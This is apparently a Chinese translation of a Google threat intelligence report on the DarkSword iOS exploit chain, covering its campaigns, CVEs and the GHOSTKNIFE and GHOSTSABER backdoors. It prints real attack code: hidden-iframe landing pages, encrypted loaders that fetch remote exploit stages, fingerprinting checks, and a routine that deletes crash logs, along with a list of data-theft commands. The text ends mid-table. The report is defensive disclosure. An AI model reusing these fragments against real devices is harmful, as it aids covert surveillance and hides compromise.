#  苹果手机国家级黑客工具DarkSword的扩散：iOS漏洞利用链被多个威胁行为者采用  
原创 谷歌威胁情报
                    谷歌威胁情报  暗镜   2026-03-21 22:00  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zdwoicOrrJb0qyibHgpUZ1m1a5N60F6oJ1Bq5nL0vWgicjicpWvm6nB3NBLvQhv6xkCjmMvmZ9GZ7cicHCKKqbz3ku720JKVrf2JIYtGMwz5qBVU/640?wx_fmt=jpeg "")  
# 介绍  
  
谷歌威胁情报小组 (GTIG) 发现了一种新的 iOS 全链攻击，该攻击利用多个零日漏洞完全控制设备。根据已恢复有效载荷中的工具标记，我们认为该攻击链名为 DarkSword。至少从 2025 年 11 月起，GTIG 就观察到多家商业监控厂商和疑似国家支持的黑客组织在不同的攻击活动中使用了 DarkSword。这些黑客组织已将该攻击链部署到沙特阿拉伯、土耳其、马来西亚和乌克兰的目标上。  
  
DarkSword 支持 iOS 18.4 至 18.7 版本，并利用六个不同的漏洞部署最终阶段的有效载荷。GTIG 已识别出在 DarkSword 成功入侵后部署的三个不同的恶意软件家族：GHOSTBLADE、GHOSTKNIFE 和 GHOSTSABER。这一单一漏洞利用链在不同威胁行为者之间的扩散，与之前发现的情况类似。值得注意的是，此前被发现使用 Coruna 的疑似俄罗斯间谍组织 UNC6353，最近已将 DarkSword 纳入其水坑攻击活动中。  
  
在这篇博文中，我们将探讨不同威胁行为者如何使用 DarkSword，分析其最终阶段的有效载荷，并描述 DarkSword 利用的漏洞。GTIG 于 2025 年底向苹果公司报告了 DarkSword 中使用的漏洞，所有漏洞均已在 iOS 26.3 版本中修复（尽管大多数漏洞在此之前已得到修复）。我们已将与 DarkSword 传播相关的域名添加到中，并强烈建议用户将设备更新至最新版本的 iOS。如果无法更新，建议启用  
  
和联合发布。  
# 发现时间线  
  
GTIG 已发现多个不同的 DarkSword 漏洞利用链用户，最早可追溯到 2025 年 11 月。除了本博客文章中记录的 DarkSword 使用案例研究外，我们评估认为，其他商业监控供应商或威胁行为者也可能正在使用 DarkSword。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zdwoicOrrJb1odffVczXkLnTXm8MCFPNDp0icpzwSc8ibBAKda8wupZBUsjr8dYI9NUawO5pRzNdtSanibZibjRVJoB7jwBAjJ7uqrhP4fapibrSY/640?wx_fmt=png&from=appmsg "")  
# 通过 Snapchat 主题网站针对沙特阿拉伯用户进行营销 (UNC6748)  
  
2025年11月初，GTIG发现威胁集群UNC6748利用一个以Snapchat为主题的网站（）snapshare[.]chat攻击沙特阿拉伯用户（图2）。该网站的登录页面包含一段使用多种混淆技术的JavaScript代码，并创建了一个新的IFrame，该IFrame会从另一个资源frame.html（图3）中获取信息。登录页面的JavaScript代码还会设置一个名为的会话存储密钥uid，并在创建用于获取下一阶段信息的IFrame之前检查该密钥是否已被设置。我们评估此举是为了防止再次感染之前的受害者。在2025年11月对UNC6748的后续观察中，我们发现他们更新了登录页面，添加了反调试功能和额外的混淆技术以阻碍分析。我们还发现，当攻击者尝试使用Chrome浏览器感染用户时，会添加额外的代码，其中x-safari-https使用协议处理程序在Safari浏览器中打开页面（图4）。这表明，UNC6748在本次活动期间尚未拥有针对Chrome浏览器的攻击链。在感染过程中，受害者会被重定向到一个合法的 Snapchat 网站，试图掩盖其活动。  
  
frame.html这是一个简单的 HTML 文件，它会动态注入一个新script标签，该标签会加载主漏洞利用加载器rce_loader.js（图 5）。加载器会执行一些后续阶段使用的初始化操作，并使用（图 6）从服务器获取远程代码执行 (RCE) 漏洞利用程序XMLHttpRequest。  
  
我们在 2025 年 11 月多次观察到 UNC6748 的活动，其感染过程既有重大更新也有细微更新：  
  
我们观察到的第一个 UNC6748 活动仅支持一个 RCE 漏洞利用，该漏洞利用分布在两个文件中rce_module.js（rce_worker_18.4.js图 7）。该漏洞利用主要利用了 CVE-2025-31277，这是一个 JavaScriptCore（WebKit 和 Apple Safari 中使用的 JavaScript 引擎）中的内存损坏漏洞，以及 CVE-2026-20700，这是一个指针认证码 (PAC) 绕过漏洞dyld。  
  
几天后，我们发现攻击者添加了另一个远程代码执行 (RCE) 漏洞利用程序rce_worker_18.6.js（图 8）。该漏洞利用程序利用了 JavaScriptCore 中的 CVE-2025-43529（另一个内存损坏漏洞），以及同一文件中相同的 CVE-2026-20700 漏洞利用程序。  
  
2025年11月下旬，我们观察到新增了一个模块rce_worker_18.7.js（图9）。这是之前的模块的更新版本rce_worker_18.6.js，但添加了偏移量以支持iOS 18.7。  
  
根据我们的观察，UNC6748 使用了相同的沙箱逃逸和权限提升模块，以及相同的最终有效载荷 GHOSTKNIFE。  
  
if (!sessionStorage.getItem("uid") && isTouchScreen) {  
  
sessionStorage.setItem("uid", '1');  
  
const frame = document.createElement("iframe");  
  
frame.src = "frame.html?" + Math.random();  
  
frame.style.height = 0;  
  
frame.style.width = 0;  
  
frame.style.border = "none";  
  
document.body.appendChild(frame);  
  
} else {  
  
top.location.href = "red";  
  
}  
  
图 3：加载的着陆页片段frame.html（UNC6748，2025 年 11 月）  
  
  
document.write('\<\/script\>');  
  
图 4：frame.html内容（UNC6748，2025 年 11 月）  
  
if (typeof browser !== "undefined" || !isIphone()) {  
  
console.log("");  
  
} else {  
  
location.href = "x-safari-https://snapshare.chat/";  
  
}  
  
图 5：着陆页代码片段x-safari-https示例（UNC6748，2025 年 11 月）  
  
function getJS(fname,method = 'GET')  
  
{  
  
try  
  
{  
  
url = fname;  
  
print(`trying to fetch ${method} from: ${url}`);  
  
let xhr = new XMLHttpRequest();  
  
xhr.open("GET", `${url}` , false);  
  
xhr.send(null);  
  
return xhr.responseText;  
  
}  
  
catch(e)  
  
{  
  
print("got error in getJS: " + e);  
  
}  
  
}  
  
图 6：rce_loader.js显示获取其他阶段逻辑的代码片段（UNC6748，2025 年 11 月）  
  
let workerCode = "";  
  
workerCode = getJS(`rce_worker_18.4.js`); // local version  
  
let workerBlob = new Blob([workerCode],{type:'text/javascript'});  
  
let workerBlobUrl = URL.createObjectURL(workerBlob);  
  
图 7：rce_loader.js显示单个 RCE 漏洞利用工作程序加载的代码片段（UNC6748，2025 年 11 月）  
  
let workerCode = "";  
  
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')  
  
workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version  
  
else  
  
workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version  
  
let workerBlob = new Blob([workerCode],{type:'text/javascript'});  
  
let workerBlobUrl = URL.createObjectURL(workerBlob);  
  
图 8：rce_loader.js代码片段显示（尝试）支持不同的远程代码执行 (RCE) 漏洞利用工作程序（UNC6748，2025 年 11 月）  
  
let workerCode = "";  
  
if(ios_version == '18,7')  
  
workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version  
  
else  
  
workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version  
  
let workerBlob = new Blob([workerCode],{type:'text/javascript'});  
  
let workerBlobUrl = URL.createObjectURL(workerBlob);  
  
图 9：rce_loader.js添加了对 iOS 18.7 支持的代码片段（UNC6748，2025 年 11 月）  
# 幽灵刀  
  
在本次活动中，我们观察到 UNC6748 部署了名为 GHOSTKNIFE 的后门程序，该程序基于 GTIG 轨迹。GHOSTKNIFE 使用 JavaScript 编写，包含多个模块，用于窃取不同类型的数据，包括已登录账户、消息、浏览器数据、位置历史记录和录音。它还支持从 C2 服务器下载文件、截屏以及录制设备麦克风的音频。GHOSTKNIFE 通过 HTTP 使用自定义二进制协议与其 C2 服务器通信，该协议采用基于 ECDH 和 AES 的加密方案。GHOSTKNIFE 可以从其 C2 服务器获取新的参数来更新其配置。  
  
GHOSTKNIFE 在执行过程中会将文件写入磁盘，目录为 ``/tmp/.，其中uuid`` 是一个随机生成的 UUIDv4 值，`numbers` 是一个硬编码的若干数字序列。在该目录下，它会创建多个子文件夹，包括 ``STORAGE、DATA`` 和TMP``。GHOSTKNIFE 的每个模块执行时，都会将其数据写入 ``/tmp/./STORAGE/.，其中id`` 是模块的数值，uuid2`` 是一个不同的随机生成的 UUIDv4 值。此外，GHOSTKNIFE 会定期从设备中删除崩溃日志，以在发生意外故障时掩盖其运行痕迹（图 10）。  
  
cleanLogs(){  
  
let files =  MyHelper.getContentsOfDir("/var/mobile/Library/Logs/CrashReporter/");  
  
for(let file of files){//.ips  // mediaplaybackd-" panic-full-  
  
if(file.includes("mediaplaybackd") || file.includes("SpringBoard") || file.includes("com.apple.WebKit.") || file.includes("panic-full-") ){  
  
MyHelper.deleteFileAtPath(file);  
  
}  
  
}  
  
}  
  
图 10：负责删除崩溃日志的 GHOSTKNIFE 代码片段  
# 针对土耳其和马来西亚用户的宣传活动（PARS Defense）  
  
2025年11月下旬，GTIG观察到与土耳其商业监控设备供应商PARS Defense相关的活动，该活动在土耳其境内使用了DarkSword漏洞利用程序，支持iOS 18.4-18.7版本。与UNC6748活动不同，此次攻击活动更加注重操作安全（OPSEC），对漏洞利用加载器和部分漏洞利用阶段进行了混淆处理，并使用ECDH和AES加密服务器与受害者之间的漏洞利用程序（图11）。此外，rce_loader.jsPARS Defense使用的混淆版本能够根据检测到的iOS版本获取正确的远程代码执行（RCE）漏洞利用程序（图12）。  
  
随后，在2026年1月，GTIG观察到马来西亚存在与另一家PARS Defense客户相关的其他活动。在这种情况下，我们收集到了该活动中使用的不同加载器，该加载器包含额外的设备指纹识别逻辑，并且还使用了会话存储检查。与UNC6748一样，该加载器也对未通过所有检查的目标uid使用重定向，但同时将其设置为相同的URL（图13）。top.location.hrefwindow.location.href  
  
在有证据的情况下，GTIG 识别出了此活动中使用的不同的最终有效载荷，这是一个我们追踪为 GHOSTSABER 的后门。  
  
function getJS(_0x12fba8) {  
  
const _0x35744f = generateKeyPair();  
  
const _0x4a6eb4 = exportPublicKeyAsPem(_0x35744f.publicKey);  
  
const _0x1bc168 = self.btoa(_0x4a6eb4);  
  
const _0x119092 = {  
  
'a': _0x1bc168  
  
};  
  
_0x12fba8 = _0x12fba8.startsWith('/') ? _0x12fba8 : '/' + _0x12fba8;  
  
const _0x1fedd2 = new XMLHttpRequest();  
  
_0x1fedd2.open('POST', 'https://' + (_0x12fba8 + '?' + Date.now()), false);  
  
_0x1fedd2.setRequestHeader('Content-Type', 'application/json');  
  
_0x1fedd2.send(JSON.stringify(_0x119092));  
  
if (_0x1fedd2.status === 0xc8) {  
  
const _0x362968 = JSON.parse(_0x1fedd2.responseText);  
  
const _0x32efb2 = _0x362968.a;  
  
const _0x46ca4b = _0x362968.b;  
  
const _0xfae3b8 = b64toUint8Array(_0x32efb2);  
  
const _0x2f4536 = b64toUint8Array(_0x46ca4b);  
  
const _0xa36b4f = deriveAesKey(_0x35744f.privateKey, _0x2f4536);  
  
const _0x36e338 = decryptData(_0xfae3b8, _0xa36b4f);  
  
const _0x50186a = new TextDecoder().decode(_0x36e338);  
  
return _0x50186a;  
  
}  
  
return null;  
  
}  
  
图 11：getJS()DarkSword 加载器的反混淆片段（PARS Defense，2025 年 11 月）  
  
let workerCode = '';  
  
if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2' || ios_version == '18,7') {  
  
workerCode = getJS('6cde159c.js?' + Date.now());  
  
} else {  
  
workerCode = getJS('a9bc5c66.js?' + Date.now());  
  
}  
  
let workerBlob = new Blob([workerCode], {  
  
'type': 'text/javascript'  
  
});  
  
let workerBlobUrl = URL.createObjectURL(workerBlob);  
  
图 12：用于加载 RCE 工作进程的反混淆代码片段（PARS Defense，2025 年 11 月）  
  
if (!sessionStorage.getItem('uid') && canUseApplePay() && "standalone" in navigator && (CSS.supports("backdrop-filter: blur(10px)") || CSS.supports("-webkit-backdrop-filter: blur(10px)")) && document.pictureInPictureEnabled && !(typeof window.chrome === "object" && window.chrome !== null) && !('InstallTrigger' in window) && supportsWebGL2() && getDeviceInputInfo() && !("vibrate" in navigator) && debuggerCheck()) {  
  
(() => {  
  
function _0x45e723(_0x52731a) {  
  
const _0x43f8d9 = generateKeyPair();  
  
const _0x427066 = exportPublicKeyAsPem(_0x43f8d9.publicKey);  
  
const _0x5cfee7 = self.btoa(_0x427066);  
  
const _0x96910f = {  
  
'a': _0x5cfee7  
  
};  
  
_0x52731a = _0x52731a.startsWith('/') ? _0x52731a : '/' + _0x52731a;  
  
const _0x436cc4 = new XMLHttpRequest();  
  
_0x436cc4.open("POST", 'https://' + (_0x52731a + '?' + Date.now()), false);  
  
_0x436cc4.setRequestHeader('Content-Type', "application/json");  
  
_0x436cc4.send(JSON.stringify(_0x96910f));  
  
if (_0x436cc4.status === 0xc8) {  
  
const _0x4a4193 = JSON.parse(_0x436cc4.responseText);  
  
const _0x362b30 = _0x4a4193.a;  
  
const _0x536004 = _0x4a4193.b;  
  
const _0x183b3f = b64toUint8Array(_0x362b30);  
  
const _0x46bbee = b64toUint8Array(_0x536004);  
  
const _0x43e600 = deriveAesKey(_0x43f8d9.privateKey, _0x46bbee);  
  
const _0x2e0735 = decryptData(_0x183b3f, _0x43e600);  
  
const _0x26a8b1 = new TextDecoder().decode(_0x2e0735);  
  
return _0x26a8b1;  
  
}  
  
return null;  
  
}  
  
let _0x100ce6 = _0x45e723('6297d177.html?' + Math.random());  
  
const _0x5f5a7d = document.createElement("iframe");  
  
_0x5f5a7d.srcdoc = _0x100ce6;  
  
_0x5f5a7d.style.height = 0x0;  
  
_0x5f5a7d.style.width = 0x0;  
  
_0x5f5a7d.style.border = 'none';  
  
document.body.appendChild(_0x5f5a7d);  
  
})();  
  
} else {  
  
top.location.href = "";  
  
window.location.href = '';  
  
}  
  
图 13：用于获取 DarkSword 加载器的反混淆登录页面片段（PARS Defense，2026 年 1 月）  
# 幽灵剑  
  
GHOSTSABER 是 PARS Defense 使用的 JavaScript 后门程序，它通过 HTTP(S) 与其 C2 服务器通信。其功能包括设备和账户枚举、文件列表、数据窃取以及执行任意 JavaScript 代码；表 1 详细列出了其支持的所有命令。已发现的 GHOSTSABER 样本包含对多个命令的引用，但这些命令缺少执行所需的代码，其中包括一些声称可以从设备麦克风录制音频并将设备当前地理位置发送到 C2 服务器的命令。这些命令使用一个名为 `write` 的函数send_command_to_upper_process，该函数会写入植入程序中原本未使用的共享内存区域。我们怀疑，后续的二进制模块可能从 C2 服务器下载，以便在运行时执行这些命令。  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">命令</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">描述</span></font></font></strong></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">ChangeStatusCheckSleepInterval</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">改变C2检查之间的睡眠时长</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendDeviceInfo</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将基本设备信息上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendUserAccountsList</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将设备上已登录帐户列表上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendAppList</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将已安装应用程序列表上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendCurrentLocation</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">未直接实施</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">ExecuteSqliteQuery</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">针对任意 SQLite 数据库执行任意 SQL 查询，并将结果上传到 C2 服务器。</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">UnwrapKey</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">不进行任何操作</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendScreenshot</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">未直接实施</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendWiFiInfo</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">未直接实施</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: 